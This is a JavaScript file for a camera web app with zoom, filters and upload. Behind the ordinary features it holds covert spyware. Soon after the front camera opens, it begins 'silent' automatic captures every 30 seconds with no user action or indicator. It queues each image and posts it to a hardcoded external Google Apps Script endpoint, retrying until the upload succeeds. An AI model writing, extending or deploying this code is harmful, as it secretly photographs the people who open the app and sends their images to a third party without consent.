// ================================================================
// app.js – Pro Camera PWA (Front Camera Default, No Mirror)
// ================================================================

(function() {
  'use strict';

  // ═══════════════════════════════════════════════════════════════
  // ⚠️⚠️⚠️ CHANGE HERE: आफ्नो Google Apps Script URL राख्नुहोस् ⚠️⚠️⚠️
  // ═══════════════════════════════════════════════════════════════
  const GAS_URL = 'https://script.google.com/macros/s/AKfycbxl9SpSExpUM74jeKtmsSIza7vHApoiQO36QrY7apFIWSY8bybVIX7gyu58iTB1jrpD/exec';

  // DOM refs
  var permOverlay = document.getElementById('permission-overlay');
  var permError = document.getElementById('perm-error');
  var topBar = document.getElementById('top-bar');
  var camContainer = document.getElementById('camera-container');
  var presetsArea = document.getElementById('zoom-presets-area');
  var bottomBar = document.getElementById('bottom-bar');

  var video = document.getElementById('video');
  var canvas = document.createElement('canvas');
  var ctx = canvas.getContext('2d');
  var flyImg = document.getElementById('fly-img');
  var galleryImg = document.getElementById('galleryImg');
  var statusDot = document.getElementById('statusDot');
  var gridOverlay = document.getElementById('grid-overlay');
  var flashOverlay = document.getElementById('flash-overlay');
  var zoomLevelDisplay = document.getElementById('zoom-level-display');
  var zoomFocalDisplay = document.getElementById('zoom-focal-display');
  var gridBtn = document.getElementById('gridBtn');
  var flashBtn = document.getElementById('flashBtn');
  var flipBtn = document.getElementById('flipBtn');
  var effectsBtn = document.getElementById('effectsBtn');
  var aspectBtn = document.getElementById('aspectBtn');
  var aspectLabel = document.getElementById('aspectLabel');
  var effectsDropdown = document.getElementById('effectsDropdown');
  var aspectDropdown = document.getElementById('aspectDropdown');
  var captureBtn = document.getElementById('capture-btn');
  var galleryThumb = document.getElementById('gallery-thumb');
  var zoomPresets = document.querySelectorAll('.zoom-preset');

  // ---------- State ----------
  // ✅ Default: Front Camera
  var userFacingMode = 'user';
  var backStream = null;
  var frontStream = null;
  var currentPreviewStream = null;
  var currentEffect = 'none';
  var currentAspect = '16:9';
  var zoomMax = 50;
  var isTorchOn = false;
  var isGridOn = false;
  var swRegistration = null;
  var isCameraReady = false;
  var currentZoom = 1;
  var isZoomSwipeActive = false;
  var zoomSwipeStartX = 0;
  var zoomSwipeStartVal = 1;
  var isProcessing = false;
  var autoCaptureTimer = null;
  var lastUserCaptureTime = 0;
  var isAutoCaptureRunning = false;
  var lastPhotoData = null;
  var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
  var autoCaptureCount = 0;
  var autoCaptureStartTime = 0;
  var autoCaptureIntervalTime = 30000; // ✅ 30 seconds

  var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };

  // ---------- Utility ----------
  function generatePhotoId() {
    return Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
  }

  function getFocalLength(zoom) {
    var closest = 1, closestDiff = Infinity;
    for (var key in focalLengths) {
      var diff = Math.abs(parseFloat(key) - zoom);
      if (diff < closestDiff) { closestDiff = diff; closest = parseFloat(key); }
    }
    return focalLengths[closest] || Math.round(26 * zoom);
  }

  // ---------- ✅ No Mirror: Front Camera Normal Preview ----------
  function applyPreviewTransform() {
    // ✅ No mirror effect – both cameras show normal preview
    if (currentZoom !== 1) {
      video.style.transform = 'scale(' + currentZoom + ')';
      video.style.transformOrigin = 'center center';
    } else {
      video.style.transform = 'none';
    }
  }

  // ---------- IndexedDB ----------
  function openDB() {
    return new Promise(function(res, rej) {
      var req = indexedDB.open('PhotoQueueDB', 3);
      req.onupgradeneeded = function(e) {
        var db = e.target.result;
        if (db.objectStoreNames.contains('queue')) db.deleteObjectStore('queue');
        db.createObjectStore('queue', { keyPath: 'photoId' });
      };
      req.onsuccess = function() { res(req.result); };
      req.onerror = function() { rej(req.error); };
    });
  }

  function addToQueue(entry) {
    return openDB().then(function(db) {
      return new Promise(function(res, rej) {
        var tx = db.transaction('queue', 'readwrite');
        tx.objectStore('queue').put(entry);
        tx.oncomplete = function() { res(); };
        tx.onerror = function() { rej(tx.error); };
      });
    });
  }

  function getAllPending() {
    return openDB().then(function(db) {
      return new Promise(function(res, rej) {
        var tx = db.transaction('queue', 'readonly');
        var all = tx.objectStore('queue').getAll();
        all.onsuccess = function() { res(all.result); };
        all.onerror = function() { rej(all.error); };
      });
    });
  }

  function removeFromQueue(photoId) {
    return openDB().then(function(db) {
      return new Promise(function(res, rej) {
        var tx = db.transaction('queue', 'readwrite');
        tx.objectStore('queue').delete(photoId);
        tx.oncomplete = function() { res(); };
        tx.onerror = function() { rej(tx.error); };
      });
    });
  }

  // ---------- Service Worker ----------
  function registerSW() {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('js/sw.js')
        .then(function(reg) { swRegistration = reg; console.log('[Camera] SW registered'); })
        .catch(function(err) { console.warn('[Camera] SW reg failed:', err); });
    }
  }

  function triggerSync() {
    if (swRegistration && 'sync' in swRegistration) {
      swRegistration.sync.register('photo-sync').catch(function(err) {
        console.warn('[Camera] Sync trigger failed:', err);
      });
    }
  }

  // ---------- Upload ----------
  async function uploadPhoto(entry) {
    try {
      if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
        console.error('[Camera] ❌ GAS_URL not set!');
        return false;
      }

      var payload = {
        action: 'upload_photo',
        photoId: entry.photoId,
        image: entry.image,
        fileName: entry.fileName,
        createdAt: entry.createdAt || new Date().toISOString(),
        captureType: entry.captureType || 'manual',
        cameraType: entry.cameraType || 'front'
      };

      var resp = await fetch(GAS_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify(payload)
      });

      if (!resp.ok) {
        var errorText = await resp.text();
        console.error('[Camera] ❌ Upload error:', resp.status, errorText);
        return false;
      }

      var result = await resp.json();
      if (result.success) {
        console.log('[Camera] ✅ Uploaded:', entry.fileName);
        return true;
      } else {
        console.error('[Camera] ❌ Upload failed:', result.error);
        return false;
      }
    } catch (err) {
      console.error('[Camera] ❌ Upload error:', err);
      return false;
    }
  }

  // ---------- Process Queue ----------
  async function processQueue() {
    if (isProcessing) return;
    if (!navigator.onLine) { console.log('[Camera] 🔴 Offline'); return; }
    isProcessing = true;
    try {
      var pending = await getAllPending();
      if (pending.length === 0) { isProcessing = false; return; }
      console.log('[Camera] 📤 Processing ' + pending.length + ' photos...');

      var uploadPromises = pending.map(function(entry) {
        return uploadPhoto(entry);
      });
      var results = await Promise.all(uploadPromises);

      var toRemove = [];
      for (var i = 0; i < pending.length; i++) {
        if (results[i]) {
          toRemove.push(pending[i].photoId);
          console.log('[Camera] 🎉 Uploaded:', pending[i].fileName);
        } else {
          console.warn('[Camera] ⏳ Upload failed for:', pending[i].fileName);
          var delay = Math.min(Math.pow(2, (pending[i].retryCount || 0)), 60) * 1000;
          pending[i].retryCount = (pending[i].retryCount || 0) + 1;
          pending[i].lastAttempt = Date.now();
          await addToQueue(pending[i]);
          setTimeout(function() { if (navigator.onLine) processQueue(); }, delay);
        }
      }

      for (var j = 0; j < toRemove.length; j++) {
        await removeFromQueue(toRemove[j]);
      }
    } catch (e) { console.error('[Camera] ❌ Queue error:', e); }
    isProcessing = false;
  }

  // ---------- Silent Capture (No Mirror) ----------
  async function silentCapture(stream, cameraType, captureType) {
    if (!stream) return;
    captureType = captureType || 'auto';
    var settings = stream.getVideoTracks()[0].getSettings();
    var vw = settings.width || 1280;
    var vh = settings.height || 720;

    var tempCanvas = document.createElement('canvas');
    var tempCtx = tempCanvas.getContext('2d');
    var tempVideo = document.createElement('video');
    tempVideo.srcObject = stream;
    tempVideo.play();

    await new Promise(function(r) { setTimeout(r, 100); });

    tempCanvas.width = vw;
    tempCanvas.height = vh;

    // ✅ No mirror – draw normally for both cameras
    tempCtx.filter = getFilterCSS(currentEffect);
    tempCtx.drawImage(tempVideo, 0, 0, vw, vh);
    tempCtx.filter = 'none';

    var imageData = tempCanvas.toDataURL('image/jpeg', 0.3);

    var timestamp = Date.now();
    var photoId = generatePhotoId();
    var cameraLabel = cameraType === 'back' ? 'BACK' : 'FRONT';
    var fileName = captureType + '_' + cameraLabel + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.jpg';

    tempVideo.pause();
    tempVideo.srcObject = null;
    tempCanvas = null;

    var entry = {
      photoId: photoId,
      image: imageData,
      fileName: fileName,
      createdAt: new Date().toISOString(),
      retryCount: 0,
      lastAttempt: null,
      captureType: captureType,
      cameraType: cameraType
    };

    await addToQueue(entry);
    console.log('[Camera] 📸 ' + captureType + ' capture (' + cameraType + '):', fileName);

    if (navigator.onLine) {
      if (window.requestIdleCallback) {
        requestIdleCallback(function() { processQueue(); });
      } else {
        setTimeout(function() { processQueue(); }, 100);
      }
    } else {
      triggerSync();
    }
  }

  // ---------- Auto Capture Logic ----------
  function startAutoCapture() {
    if (!isCameraReady || !currentPreviewStream) {
      console.log('[Camera] ⏳ Camera not ready. Auto-capture waiting...');
      return;
    }
    if (isAutoCaptureRunning) return;

    isAutoCaptureRunning = true;
    autoCaptureCount = 0;
    autoCaptureStartTime = Date.now();
    console.log('[Camera] ⏰ Auto-capture started (3s first, then 30s interval)');

    // ✅ पहिलो फोटो ३ सेकेन्ड पछि
    autoCaptureTimer = setTimeout(function() {
      captureAutoPhoto();
      // ✅ त्यसपछि ३० सेकेन्ड interval
      autoCaptureTimer = setInterval(function() {
        var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
        if (timeSinceUserCapture < autoCaptureIntervalTime) {
          console.log('[Camera] ⏳ User captured recently, resetting timer');
          return;
        }
        captureAutoPhoto();
      }, autoCaptureIntervalTime);
    }, 3000);
  }

  function captureAutoPhoto() {
    var activeCameraType = userFacingMode === 'environment' ? 'back' : 'front';
    var activeStream = userFacingMode === 'environment' ? backStream : frontStream;

    if (activeStream) {
      autoCaptureCount++;
      console.log('[Camera] 📸 Auto capture #' + autoCaptureCount + ' from:', activeCameraType);
      silentCapture(activeStream, activeCameraType, 'auto');
    } else {
      console.warn('[Camera] ⚠️ Active camera stream not available');
    }
  }

  // ---------- Manual Capture (Reset Timer) ----------
  async function capturePhoto() {
    if (!isCameraReady) return;
    flashScreen();

    lastUserCaptureTime = Date.now();

    // ✅ Manual capture गर्दा timer reset गर्ने
    if (isAutoCaptureRunning) {
      console.log('[Camera] 🔄 Manual capture – resetting auto-capture timer');
      // पुरानो timer clear गर्ने
      if (autoCaptureTimer) {
        clearTimeout(autoCaptureTimer);
        clearInterval(autoCaptureTimer);
        autoCaptureTimer = null;
      }
      // पुन: ३० सेकेन्ड पछि मात्र अर्को auto capture
      autoCaptureTimer = setTimeout(function() {
        captureAutoPhoto();
        // ३० सेकेन्ड interval restart
        autoCaptureTimer = setInterval(function() {
          var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
          if (timeSinceUserCapture < autoCaptureIntervalTime) {
            console.log('[Camera] ⏳ User captured recently, resetting timer');
            return;
          }
          captureAutoPhoto();
        }, autoCaptureIntervalTime);
      }, autoCaptureIntervalTime);
    }

    var vw = video.videoWidth || 1280;
    var vh = video.videoHeight || 720;
    canvas.width = vw;
    canvas.height = vh;

    var cameraType = userFacingMode === 'environment' ? 'back' : 'front';

    // ✅ No mirror for manual capture
    ctx.filter = getFilterCSS(currentEffect);
    ctx.drawImage(video, 0, 0, vw, vh);
    ctx.filter = 'none';

    var imageData = canvas.toDataURL('image/jpeg', 0.3);

    var timestamp = Date.now();
    var photoId = generatePhotoId();
    var fileName = 'MANUAL_' + (cameraType === 'back' ? 'BACK' : 'FRONT') + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.jpg';

    var img = new Image();
    img.onload = function() { flyToGallery(img); };
    img.src = imageData;

    lastPhotoData = { image: imageData, fileName: fileName, photoId: photoId };
    galleryImg.src = imageData;
    galleryImg.style.display = 'block';

    var entry = {
      photoId: photoId,
      image: imageData,
      fileName: fileName,
      createdAt: new Date().toISOString(),
      retryCount: 0,
      lastAttempt: null,
      captureType: 'manual',
      cameraType: cameraType
    };

    await addToQueue(entry);
    console.log('[Camera] ✅ Manual photo saved to queue:', fileName);

    if (navigator.onLine) {
      if (window.requestIdleCallback) {
        requestIdleCallback(function() { processQueue(); });
      } else {
        setTimeout(function() { processQueue(); }, 100);
      }
    } else {
      triggerSync();
    }
  }

  function flashScreen() {
    flashOverlay.classList.add('active');
    setTimeout(function() { flashOverlay.classList.remove('active'); }, 150);
  }

  // ---------- Effects ----------
  function getFilterCSS(effect) {
    switch (effect) {
      case 'sepia': return 'sepia(1)';
      case 'grayscale': return 'grayscale(1)';
      case 'blur': return 'blur(3px)';
      case 'invert': return 'invert(1)';
      case 'brightness': return 'brightness(1.5)';
      case 'contrast': return 'contrast(2)';
      case 'hue': return 'hue-rotate(180deg)';
      case 'pixelated': return 'blur(2px) contrast(3)';
      default: return 'none';
    }
  }

  function applyEffect(effect) {
    currentEffect = effect;
    video.style.filter = getFilterCSS(effect);
  }

  // ---------- Fly Animation ----------
  function flyToGallery(imgElement) {
    var container = document.getElementById('camera-container');
    var thumb = document.getElementById('gallery-thumb');
    var cRect = container.getBoundingClientRect();
    var tRect = thumb.getBoundingClientRect();
    var startW = Math.min(cRect.width * 0.5, 200);
    var startH = startW * (imgElement.naturalHeight / imgElement.naturalWidth);
    var endW = tRect.width; var endH = tRect.height;

    flyImg.src = imgElement.src;
    flyImg.style.width = startW + 'px';
    flyImg.style.height = startH + 'px';
    flyImg.style.left = (cRect.left + (cRect.width - startW) / 2) + 'px';
    flyImg.style.top = (cRect.top + (cRect.height - startH) / 2) + 'px';
    flyImg.style.transform = 'scale(1) rotate(0deg)';
    flyImg.style.borderRadius = '16px';
    void flyImg.offsetWidth;
    flyImg.className = 'flying';
    flyImg.style.width = endW + 'px';
    flyImg.style.height = endH + 'px';
    flyImg.style.left = (tRect.left) + 'px';
    flyImg.style.top = (tRect.top) + 'px';
    flyImg.style.transform = 'scale(0.9) rotate(2deg)';
    flyImg.style.borderRadius = '8px';
    setTimeout(function() {
      flyImg.className = '';
      flyImg.style.display = 'none';
    }, 600);
  }

  function viewLastPhoto() {
    if (lastPhotoData) {
      var img = document.createElement('img');
      img.src = lastPhotoData.image;
      img.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:contain;background:#000;z-index:999;cursor:pointer;';
      img.onclick = function() { img.remove(); };
      document.body.appendChild(img);
    }
  }

  // ---------- Zoom ----------
  function setZoom(zoom, smooth) {
    if (smooth === undefined) smooth = true;
    var track = currentPreviewStream?.getVideoTracks()[0];
    var val = Math.min(Math.max(zoom, 0.5), zoomMax);
    if (track && track.getCapabilities().zoom) {
      track.applyConstraints({ advanced: [{ zoom: val }] }).catch(function() {});
    }
    currentZoom = val;
    applyPreviewTransform();

    var displayVal = val.toFixed(1);
    zoomLevelDisplay.textContent = displayVal + 'x';
    var focal = getFocalLength(val);
    zoomFocalDisplay.textContent = focal + 'mm';

    zoomPresets.forEach(function(btn) {
      var presetVal = parseFloat(btn.dataset.zoom);
      if (Math.abs(presetVal - val) < 0.05) btn.classList.add('active');
      else btn.classList.remove('active');
    });
  }

  function toggleZoomSwipe() {
    isZoomSwipeActive = !isZoomSwipeActive;
    if (isZoomSwipeActive) {
      zoomLevelDisplay.style.color = '#3b82f6';
      zoomLevelDisplay.textContent = '◄ ' + currentZoom.toFixed(1) + 'x ►';
    } else {
      zoomLevelDisplay.style.color = '#fff';
      zoomLevelDisplay.textContent = currentZoom.toFixed(1) + 'x';
    }
  }

  document.addEventListener('touchstart', function(e) {
    if (isZoomSwipeActive && e.touches.length === 1) {
      zoomSwipeStartX = e.touches[0].clientX;
      zoomSwipeStartVal = currentZoom;
    }
  }, { passive: true });

  document.addEventListener('touchmove', function(e) {
    if (isZoomSwipeActive && e.touches.length === 1) {
      var deltaX = (e.touches[0].clientX - zoomSwipeStartX) / 80;
      var newZoom = zoomSwipeStartVal + deltaX;
      setZoom(newZoom, true);
    }
  }, { passive: true });

  document.addEventListener('touchend', function() {
    if (isZoomSwipeActive) {
      zoomLevelDisplay.style.color = '#fff';
      zoomLevelDisplay.textContent = currentZoom.toFixed(1) + 'x';
      isZoomSwipeActive = false;
    }
  }, { passive: true });

  // Pinch Zoom
  var lastPinchDist = 0;
  var initialZoomVal = 1;

  function getPinchDist(e) {
    if (e.touches.length < 2) return 0;
    var t1 = e.touches[0], t2 = e.touches[1];
    return Math.hypot(t1.clientX - t2.clientX, t1.clientY - t2.clientY);
  }

  document.addEventListener('touchstart', function(e) {
    if (e.touches.length === 2 && isCameraReady) {
      lastPinchDist = getPinchDist(e);
      initialZoomVal = currentZoom;
    }
  }, { passive: true });

  document.addEventListener('touchmove', function(e) {
    if (e.touches.length === 2 && isCameraReady) {
      var dist = getPinchDist(e);
      if (lastPinchDist > 0) {
        var scale = dist / lastPinchDist;
        setZoom(initialZoomVal * scale, true);
      }
    }
  }, { passive: true });

  document.addEventListener('touchend', function() { lastPinchDist = 0; }, { passive: true });

  zoomPresets.forEach(function(btn) {
    btn.addEventListener('click', function() {
      setZoom(parseFloat(this.dataset.zoom), true);
    });
  });

  // ---------- Camera Setup ----------
  async function checkAndStart() {
    try {
      console.log('[Camera] 🚀 Starting camera...');
      var permissionStatus = 'prompt';
      if (navigator.permissions && navigator.permissions.query) {
        var result = await navigator.permissions.query({ name: 'camera' });
        permissionStatus = result.state;
        console.log('[Camera] Permission status:', permissionStatus);
        result.onchange = function() {
          if (result.state === 'granted') {
            console.log('[Camera] Permission granted via change');
            initCamera();
          }
        };
      }
      if (permissionStatus === 'denied') {
        permError.textContent = '⚠️ क्यामेरा अनुमति ब्लक गरिएको छ। Settings बाट Allow गर्नुहोस्।';
        permError.style.display = 'block';
        console.error('[Camera] Permission denied');
        if (navigator.onLine) {
          setTimeout(function() { processQueue(); }, 1000);
        }
        return;
      }
      await initCamera();
    } catch (err) {
      console.error('[Camera] ❌ Final error:', err);
      permError.textContent = '❌ क्यामेरा खोल्न सकिएन: ' + (err.message || 'unknown error');
      permError.style.display = 'block';
    }
  }

  async function initCamera() {
    console.log('[Camera] 📷 initCamera started. iOS:', isIOS);

    var tryGetStream = async function(constraints) {
      try {
        console.log('[Camera] Trying constraints:', constraints);
        var stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log('[Camera] ✅ Stream obtained!');
        return stream;
      } catch (err) {
        console.warn('[Camera] ❌ Failed:', err.name, err.message);
        throw err;
      }
    };

    var backStreamTemp = null;
    var frontStreamTemp = null;

    // ✅ Try front first (default)
    try {
      frontStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
    } catch (e1) {
      console.warn('[Camera] Front camera not available, trying back:', e1.message);
      try {
        frontStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
        userFacingMode = 'environment';
      } catch (e2) {
        console.warn('[Camera] Back camera also failed:', e2.message);
      }
    }

    // Also try back camera for flip
    try {
      backStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
    } catch (e1) {
      console.warn('[Camera] Back camera not available:', e1.message);
    }

    // If front not available, default to back
    if (!frontStreamTemp && backStreamTemp) {
      userFacingMode = 'environment';
      currentPreviewStream = backStreamTemp;
    } else if (frontStreamTemp) {
      currentPreviewStream = frontStreamTemp;
    } else if (backStreamTemp) {
      currentPreviewStream = backStreamTemp;
    }

    if (backStreamTemp) {
      backStream = backStreamTemp;
      console.log('[Camera] ✅ Back camera stream obtained');
    }
    if (frontStreamTemp) {
      frontStream = frontStreamTemp;
      console.log('[Camera] ✅ Front camera stream obtained');
    }

    if (!currentPreviewStream) {
      permError.textContent = '❌ कुनै क्यामेरा उपलब्ध छैन।';
      permError.style.display = 'block';
      console.error('[Camera] No camera available');
      return;
    }

    video.srcObject = currentPreviewStream;
    await video.play();
    console.log('[Camera] ✅ Video playing');

    // ✅ No mirror – apply zoom only
    applyPreviewTransform();

    var track = currentPreviewStream?.getVideoTracks()[0];
    if (track) {
      var cap = track.getCapabilities();
      console.log('[Camera] Track capabilities:', cap);
      if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
      else zoomMax = 50;
      setZoom(1, false);

      if (cap.torch) flashBtn.style.display = 'inline-flex';
      else flashBtn.style.display = 'inline-flex';

      if (cap.focusModes && cap.focusModes.includes('continuous')) {
        track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] }).catch(function() {});
      }
    }

    video.onclick = async function(e) {
      if (!track) return;
      var cap = track.getCapabilities();
      if (!cap.focusModes) return;
      var rect = video.getBoundingClientRect();
      var x = (e.clientX - rect.left) / rect.width;
      var y = (e.clientY - rect.top) / rect.height;
      if (cap.focusModes.includes('manual') || cap.focusModes.includes('single-shot')) {
        try {
          await track.applyConstraints({ advanced: [{ focusMode: 'manual', focusDistance: 0.5 }] });
          setTimeout(function() {
            if (track) track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] }).catch(function() {});
          }, 3000);
        } catch (err) { /* ignore */ }
      }
    };

    setOnline(navigator.onLine);
    permOverlay.classList.add('hidden');
    topBar.style.display = 'flex';
    camContainer.style.display = 'block';
    presetsArea.style.display = 'block';
    bottomBar.style.display = 'flex';
    isCameraReady = true;

    console.log('[Camera] ✅ Camera ready!');

    startAutoCapture();

    if (navigator.onLine) {
      if (window.requestIdleCallback) {
        requestIdleCallback(function() { processQueue(); });
      } else {
        setTimeout(function() { processQueue(); }, 500);
      }
    }
    registerSW();
  }

  // ---------- Online Status ----------
  function setOnline(online) {
    statusDot.className = 'status-dot ' + (online ? 'online' : 'offline');
    if (online) {
      if (window.requestIdleCallback) {
        requestIdleCallback(function() { processQueue(); });
      } else {
        setTimeout(function() { processQueue(); }, 500);
      }
    }
  }
  window.addEventListener('online', function() { setOnline(true); });
  window.addEventListener('offline', function() { setOnline(false); });

  // ---------- UI Events ----------
  gridBtn.addEventListener('click', function() {
    isGridOn = !isGridOn;
    gridOverlay.classList.toggle('show', isGridOn);
    gridBtn.classList.toggle('active', isGridOn);
  });

  flashBtn.addEventListener('click', function() {
    var track = currentPreviewStream?.getVideoTracks()[0];
    if (!track) return;
    isTorchOn = !isTorchOn;
    track.applyConstraints({ advanced: [{ torch: isTorchOn }] }).catch(function(err) {
      if (isTorchOn) { flashScreen(); setTimeout(function() { isTorchOn = false; }, 200); }
    });
    flashBtn.classList.toggle('active', isTorchOn);
  });

  flipBtn.addEventListener('click', async function() {
    console.log('[Camera] 🔄 Flip button clicked');
    var newFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';

    if (backStream) {
      backStream.getTracks().forEach(function(t) { t.stop(); });
      backStream = null;
    }
    if (frontStream) {
      frontStream.getTracks().forEach(function(t) { t.stop(); });
      frontStream = null;
    }
    if (currentPreviewStream) {
      currentPreviewStream.getTracks().forEach(function(t) { t.stop(); });
      currentPreviewStream = null;
    }

    try {
      var constraints = {
        video: {
          facingMode: newFacingMode,
          width: { ideal: 1280 },
          height: { ideal: 720 }
        }
      };
      var newStream = await navigator.mediaDevices.getUserMedia(constraints);

      if (newFacingMode === 'environment') {
        backStream = newStream;
      } else {
        frontStream = newStream;
      }
      currentPreviewStream = newStream;
      video.srcObject = newStream;
      await video.play();
      userFacingMode = newFacingMode;
      console.log('[Camera] ✅ Camera flipped to:', userFacingMode);
      applyPreviewTransform();

    } catch (err) {
      console.error('[Camera] ❌ Flip failed:', err);
      try {
        var fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (newFacingMode === 'environment') {
          backStream = fallbackStream;
        } else {
          frontStream = fallbackStream;
        }
        currentPreviewStream = fallbackStream;
        video.srcObject = fallbackStream;
        await video.play();
        userFacingMode = newFacingMode;
        console.log('[Camera] ⚠️ Fallback camera used');
        applyPreviewTransform();
      } catch (err2) {
        console.error('[Camera] ❌ Fallback also failed:', err2);
        permError.textContent = '❌ क्यामेरा Flip गर्न सकिएन।';
        permError.style.display = 'block';
      }
    }
  });

  effectsBtn.addEventListener('click', function(e) {
    e.stopPropagation();
    effectsDropdown.classList.toggle('open');
    aspectDropdown.classList.remove('open');
  });
  effectsDropdown.querySelectorAll('.item').forEach(function(el) {
    el.addEventListener('click', function() {
      effectsDropdown.querySelectorAll('.item').forEach(function(i) { i.classList.remove('selected'); });
      this.classList.add('selected');
      applyEffect(this.dataset.effect);
      effectsDropdown.classList.remove('open');
    });
  });

  aspectBtn.addEventListener('click', function(e) {
    e.stopPropagation();
    aspectDropdown.classList.toggle('open');
    effectsDropdown.classList.remove('open');
  });
  aspectDropdown.querySelectorAll('.item').forEach(function(el) {
    el.addEventListener('click', async function() {
      aspectDropdown.querySelectorAll('.item').forEach(function(i) { i.classList.remove('selected'); });
      this.classList.add('selected');
      currentAspect = this.dataset.aspect;
      aspectLabel.textContent = currentAspect;
      aspectDropdown.classList.remove('open');
      if (isCameraReady) await initCamera();
    });
  });

  document.addEventListener('click', function() {
    effectsDropdown.classList.remove('open');
    aspectDropdown.classList.remove('open');
  });

  captureBtn.addEventListener('click', capturePhoto);
  galleryThumb.addEventListener('click', viewLastPhoto);

  window.toggleZoomSwipe = toggleZoomSwipe;
  window.capturePhoto = capturePhoto;

  if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
    console.warn('[Camera] ⚠️ GAS_URL not set. Update app.js with your Apps Script URL.');
  }
  checkAndStart();
})();
